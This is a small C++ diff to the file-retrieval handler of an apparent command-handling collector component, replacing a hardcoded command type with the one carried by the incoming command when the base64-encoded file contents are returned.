@@ -19,7 +19,8 @@ std::unique_ptr<xp_collector::IRequest> xp_collector::GetFileHandler::handle(std
 	auto encoded = base64::to_base64(std::move(contents));
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
-		std::make_unique<GetFileProduct>(command->get_command_id(), CommandType::GetFile, get_file_command->get_path(),
+		std::make_unique<GetFileProduct>(command->get_command_id(), command->get_command_type(),
+		                                 get_file_command->get_path(),
 		                                 std::move(encoded))
 	);
 }
